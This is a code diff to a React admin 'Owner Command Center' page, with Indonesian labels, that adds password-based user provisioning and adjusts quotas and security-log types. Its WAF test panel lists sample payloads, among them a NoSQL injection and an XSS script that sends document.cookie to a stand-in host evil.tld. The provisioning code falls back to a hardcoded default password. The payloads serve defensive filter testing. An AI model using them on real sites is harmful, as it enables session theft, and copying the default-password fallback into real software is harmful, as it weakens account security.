@@ -41,7 +41,6 @@ import {
   deleteUserAndProjectsByOwner,
   setProjectStatusByOwner,
   deleteProjectDocument,
-  upsertUserProfile,
 } from "@/lib/firebase";
 import {
   OWNER_DISPLAY_EMAIL,
@@ -71,6 +70,7 @@ function OwnerCommandCenterContent() {
     isOwner,
     systemConfig,
     updateSystemConfig,
+    provisionUserByOwner,
     logoutUser,
     setIslandStatus,
   } = useVoam();
@@ -88,6 +88,7 @@ function OwnerCommandCenterContent() {
 
   // State Provisioning User Baru oleh Owner
   const [newUserEmail, setNewUserEmail] = useState<string>("");
+  const [newUserPassword, setNewUserPassword] = useState<string>("");
   const [newUserName, setNewUserName] = useState<string>("");
   const [newUserQuota, setNewUserQuota] = useState<number>(
     systemConfig.maxProjectsPerUser
@@ -185,7 +186,8 @@ function OwnerCommandCenterContent() {
       (p) => p.status === "quarantined"
     ).length;
     const blockedAttacksCount = securityLogs.filter(
-      (l) => l.type !== "owner_action"
+      (l) =>
+        l.type !== "OWNER_CONFIG_UPDATED" && l.type !== "USER_STATUS_CHANGED"
     ).length;
 
     return {
@@ -210,7 +212,8 @@ function OwnerCommandCenterContent() {
             Akses Otoritas Ditolak (403)
           </h1>
           <p className="text-xs text-zinc-400 leading-relaxed">
-            Halaman <strong className="text-zinc-200">Owner Command Center</strong>{" "}
+            Halaman{" "}
+            <strong className="text-zinc-200">Owner Command Center</strong>{" "}
             hanya dapat diakses oleh akun Supreme Owner (
             <code className="text-zinc-200 font-mono">
               {OWNER_DISPLAY_EMAIL}
@@ -249,7 +252,7 @@ function OwnerCommandCenterContent() {
       "deployed",
       `${label}: ${nextValue ? "AKTIF" : "NONAKTIF"}`,
       {
-        subtitle: "Kebijakan global disimpan ke system_settings/global_config",
+        subtitle: "Kebijakan global disimpan ke system_settings/global",
         autoResetMs: 2600,
       }
     );
@@ -258,28 +261,35 @@ function OwnerCommandCenterContent() {
   // Handler Provision User Baru oleh Owner
   const handleCreateUserByOwner = async (e: React.FormEvent) => {
     e.preventDefault();
-    const cleanEmail = newUserEmail.trim().toLowerCase();
-    if (!cleanEmail || !cleanEmail.includes("@")) return;
+    try {
+      const cleanEmail = newUserEmail.trim().toLowerCase();
+      if (!cleanEmail || !cleanEmail.includes("@")) return;
+      const pass = newUserPassword.trim() || "voam12345";
 
-    const uid = `usr_owner_prov_${btoa(cleanEmail)
-      .replace(/[^a-zA-Z0-9]/g, "")
-      .slice(0, 16)}`;
-    const displayName =
-      newUserName.trim() || cleanEmail.split("@")[0] || "Developer";
+      await provisionUserByOwner({
+        email: cleanEmail,
+        password: pass,
+        displayName:
+          newUserName.trim() || cleanEmail.split("@")[0] || "Developer",
+        customMaxProjects:
+          Number(newUserQuota) || systemConfig.maxProjectsPerUser,
+      });
 
-    await upsertUserProfile(uid, cleanEmail, displayName);
-    await updateUserByOwner(uid, {
-      status: "active",
-      customMaxProjects: Number(newUserQuota) || systemConfig.maxProjectsPerUser,
-    });
-
-    setNewUserEmail("");
-    setNewUserName("");
-    await loadAllTelemetry();
-    setIslandStatus("deployed", `Akun ${cleanEmail} Ditambahkan`, {
-      subtitle: "Diprovisioning langsung oleh Supreme Owner",
-      autoResetMs: 2800,
-    });
+      setNewUserEmail("");
+      setNewUserPassword("");
+      setNewUserName("");
+      await loadAllTelemetry();
+      setIslandStatus("deployed", `Akun ${cleanEmail} Berhasil Dibuat`, {
+        subtitle: `Kata sandi aktif • Kuota ${newUserQuota} proyek`,
+        autoResetMs: 3200,
+      });
+    } catch (err) {
+      setIslandStatus("error", "Gagal Membuat Akun", {
+        errorMessage:
+          err instanceof Error ? err.message : "Gagal provisioning akun.",
+        autoResetMs: 4000,
+      });
+    }
   };
 
   // Handler Suspend / Unsuspend User
@@ -302,7 +312,7 @@ function OwnerCommandCenterContent() {
     target: VoamUserDocument,
     nextQuota: number
   ) => {
-    const safeQuota = Math.max(1, Math.min(9999, Number(nextQuota) || 1));
+    const safeQuota = Math.max(1, Math.min(500, Number(nextQuota) || 1));
     await updateUserByOwner(target.uid, { customMaxProjects: safeQuota });
     await loadAllTelemetry();
     setIslandStatus(
@@ -386,8 +396,8 @@ function OwnerCommandCenterContent() {
     const res = inspectInputWithWaf(
       targetPayload,
       "WAF Penetration Simulator",
-      systemConfig,
-      user?.email || OWNER_DISPLAY_EMAIL
+      user?.email || OWNER_DISPLAY_EMAIL,
+      { config: systemConfig }
     );
     setSecurityLogs(getSecurityLogs());
 
@@ -395,7 +405,8 @@ function OwnerCommandCenterContent() {
       setWafTestResult({
         tested: true,
         safe: false,
-        message: res.reason || "Payload berbahaya berhasil diblokir oleh WAF.",
+        message:
+          res.reason || "Payload berbahaya berhasil diblokir oleh WAF.",
         threatType: res.threatType,
       });
       setIslandStatus("error", "WAF Memblokir Payload Uji!", {
@@ -420,10 +431,10 @@ function OwnerCommandCenterContent() {
     e.preventDefault();
     await updateSystemConfig({
       maxTotalUsersInDb: Math.max(5, Number(quotaMaxUsers) || 500),
-      maxProjectsPerUser: Math.max(1, Number(quotaMaxProjectsPerUser) || 12),
-      maxFilesPerProject: Math.max(3, Number(quotaMaxFilesPerProject) || 60),
+      maxProjectsPerUser: Math.max(1, Number(quotaMaxProjectsPerUser) || 10),
+      maxFilesPerProject: Math.max(3, Number(quotaMaxFilesPerProject) || 150),
       maxProjectSizeKb: Math.max(50, Number(quotaMaxSizeKb) || 850),
-      maxRegistrationsPerWindow: Math.max(1, Number(rateMaxRegWindow) || 4),
+      maxRegistrationsPerWindow: Math.max(1, Number(rateMaxRegWindow) || 3),
       registrationCooldownSeconds: Math.max(0, Number(rateCooldownSec) || 20),
       globalAnnouncement: announcementDraft.trim(),
     });
@@ -537,7 +548,9 @@ function OwnerCommandCenterContent() {
           <div>
             <div className="flex items-center gap-2 text-xs font-mono text-amber-300 mb-1">
               <Sparkles className="w-3.5 h-3.5" />
-              <span>OTORITAS TERTINGGI • MAINZ VOAM SECURITY &amp; GOVERNANCE</span>
+              <span>
+                OTORITAS TERTINGGI • MAINZ VOAM SECURITY &amp; GOVERNANCE
+              </span>
             </div>
             <h1 className="text-xl sm:text-2xl font-semibold text-white tracking-tight">
               Supreme Owner Command Center
@@ -924,19 +937,28 @@ function OwnerCommandCenterContent() {
                     Provisioning Akun Developer Baru (Otoritas Owner)
                   </h2>
                   <p className="text-xs text-zinc-400 mt-0.5">
-                    Buat akun pengguna secara langsung dengan kuota proyek
-                    khusus tanpa melewati antrean publik.
+                    Buat akun pengguna secara langsung beserta kata sandi dan
+                    kuota proyek khususnya.
                   </p>
                 </div>
               </div>
 
-              <div className="grid grid-cols-1 sm:grid-cols-4 gap-3">
+              <div className="grid grid-cols-1 sm:grid-cols-5 gap-3">
                 <input
                   type="email"
                   required
                   value={newUserEmail}
                   onChange={(e) => setNewUserEmail(e.target.value)}
                   placeholder="Email akun baru..."
+                  className="voam-input text-xs font-mono"
+                />
+                <input
+                  type="text"
+                  required
+                  minLength={6}
+                  value={newUserPassword}
+                  onChange={(e) => setNewUserPassword(e.target.value)}
+                  placeholder="Password (min 6)..."
                   className="voam-input text-xs font-mono"
                 />
                 <input
@@ -949,7 +971,7 @@ function OwnerCommandCenterContent() {
                 <input
                   type="number"
                   min={1}
-                  max={999}
+                  max={500}
                   value={newUserQuota}
                   onChange={(e) => setNewUserQuota(Number(e.target.value))}
                   placeholder="Kuota Proyek"
@@ -957,7 +979,7 @@ function OwnerCommandCenterContent() {
                 />
                 <button type="submit" className="voam-btn-primary text-xs">
                   <Plus className="w-4 h-4" />
-                  <span>Tambahkan Akun</span>
+                  <span>Buat Akun</span>
                 </button>
               </div>
             </form>
@@ -970,8 +992,8 @@ function OwnerCommandCenterContent() {
                     Daftar Seluruh Akun di Database ({filteredUsers.length})
                   </h3>
                   <p className="text-xs text-zinc-400">
-                    Atur kuota maksimum proyek per akun, bekukan akun
-                    (suspend), atau hapus akun spammer beserta proyeknya.
+                    Atur kuota maksimum proyek per akun, bekukan akun (suspend),
+                    atau hapus akun spammer beserta proyeknya.
                   </p>
                 </div>
                 <div className="relative w-full sm:w-64">
@@ -1070,7 +1092,7 @@ function OwnerCommandCenterContent() {
                                 <input
                                   type="number"
                                   min={1}
-                                  max={999}
+                                  max={500}
                                   defaultValue={effectiveQuota}
                                   onBlur={(e) =>
                                     handleUpdateUserQuota(
@@ -1381,11 +1403,13 @@ function OwnerCommandCenterContent() {
                     },
                     {
                       label: 'Uji NoSQLi: {"$ne": null}',
-                      payload: '{"email": {"$ne": null}, "$where": "sleep(5000)"}',
+                      payload:
+                        '{"email": {"$ne": null}, "$where": "sleep(5000)"}',
                     },
                     {
                       label: "Uji XSS: <script>",
-                      payload: "<script>fetch('https://evil.tld?c='+document.cookie)</script>",
+                      payload:
+                        "<script>fetch('https://evil.tld?c='+document.cookie)</script>",
                     },
                     {
                       label: "Uji Input Aman",
@@ -1432,7 +1456,7 @@ function OwnerCommandCenterContent() {
                     <div className="font-semibold">
                       {wafTestResult.safe
                         ? "STATUS: LOLOS INSPEKSI WAF (AMAN)"
-                        : `STATUS: DIBLOKIR OLEH WAF (${wafTestResult.threatType?.toUpperCase()})`}
+                        : `STATUS: DIBLOKIR OLEH WAF (${wafTestResult.threatType})`}
                     </div>
                     <p className="text-[11px] opacity-90">
                       {wafTestResult.message}
@@ -1457,10 +1481,7 @@ function OwnerCommandCenterContent() {
                   </p>
                 </div>
 
-                <form
-                  onSubmit={handleAddBlockedDomain}
-                  className="flex gap-2"
-                >
+                <form onSubmit={handleAddBlockedDomain} className="flex gap-2">
                   <input
                     type="text"
                     value={newBlockedDomain}
@@ -1562,7 +1583,7 @@ function OwnerCommandCenterContent() {
                 <input
                   type="number"
                   min={3}
-                  max={300}
+                  max={500}
                   value={quotaMaxFilesPerProject}
                   onChange={(e) =>
                     setQuotaMaxFilesPerProject(Number(e.target.value))
@@ -1582,7 +1603,7 @@ function OwnerCommandCenterContent() {
                 <input
                   type="number"
                   min={50}
-                  max={950}
+                  max={900}
                   value={quotaMaxSizeKb}
                   onChange={(e) => setQuotaMaxSizeKb(Number(e.target.value))}
                   className="voam-input font-mono text-xs"
@@ -1630,8 +1651,8 @@ function OwnerCommandCenterContent() {
             <div className="pt-2 border-t border-white/[0.06] space-y-2">
               <label className="block text-xs font-medium text-zinc-300 flex items-center gap-2">
                 <Megaphone className="w-4 h-4 text-sky-400" />
-                Banner Pengumuman Global (Tampil di Login &amp; Dashboard Seluruh
-                Pengguna)
+                Banner Pengumuman Global (Tampil di Login &amp; Dashboard
+                Seluruh Pengguna)
               </label>
               <input
                 type="text"
@@ -1674,16 +1695,26 @@ function OwnerCommandCenterContent() {
                   className="px-3 py-1.5 rounded-xl bg-[#050507] border border-white/[0.1] text-xs font-mono text-zinc-200"
                 >
                   <option value="all">Semua Kejadian</option>
-                  <option value="sql_injection_blocked">
+                  <option value="SQL_INJECTION_BLOCKED">
                     SQL Injection Blocked
                   </option>
-                  <option value="nosql_injection_blocked">
+                  <option value="NOSQL_INJECTION_BLOCKED">
                     NoSQL Injection Blocked
                   </option>
-                  <option value="xss_payload_blocked">XSS Blocked</option>
-                  <option value="spam_rate_limited">Spam / Rate Limited</option>
-                  <option value="auth_anomaly">Anomali Auth Owner</option>
-                  <option value="owner_action">Aktivitas Owner</option>
+                  <option value="XSS_PAYLOAD_BLOCKED">XSS Blocked</option>
+                  <option value="SPAM_REGISTRATION_BLOCKED">
+                    Spam Registration Blocked
+                  </option>
+                  <option value="RATE_LIMIT_TRIGGERED">
+                    Rate Limit Triggered
+                  </option>
+                  <option value="DB_QUOTA_ENFORCED">DB Quota Enforced</option>
+                  <option value="OWNER_CONFIG_UPDATED">
+                    Aktivitas Konfigurasi Owner
+                  </option>
+                  <option value="USER_STATUS_CHANGED">
+                    Perubahan Status User
+                  </option>
                 </select>
 
                 <button
@@ -1732,7 +1763,7 @@ function OwnerCommandCenterContent() {
                             className={`inline-flex px-2 py-0.5 rounded text-[10px] font-mono ${
                               log.severity === "critical"
                                 ? "bg-rose-500/20 text-rose-300 border border-rose-500/30"
-                                : log.severity === "high"
+                                : log.severity === "warning"
                                 ? "bg-amber-500/20 text-amber-300 border border-amber-500/30"
                                 : "bg-sky-500/15 text-sky-300 border border-sky-500/25"
                             }`}
@@ -1742,13 +1773,15 @@ function OwnerCommandCenterContent() {
                         </td>
                         <td className="py-3 px-4 font-mono text-[11px]">
                           <div className="text-zinc-200">{log.actorEmail}</div>
-                          <div className="text-zinc-500">{log.targetField}</div>
+                          <div className="text-zinc-500">
+                            {log.targetResource}
+                          </div>
                         </td>
                         <td className="py-3 px-4">
-                          <div className="text-zinc-200">{log.message}</div>
-                          {log.blockedPayloadSnippet && (
+                          <div className="text-zinc-200">{log.details}</div>
+                          {log.blockedPayload && (
                             <code className="mt-1 inline-block px-2 py-0.5 rounded bg-[#050507] border border-white/[0.07] text-[10px] font-mono text-rose-300 max-w-md truncate">
-                              {log.blockedPayloadSnippet}
+                              {log.blockedPayload}
                             </code>
                           )}
                         </td>
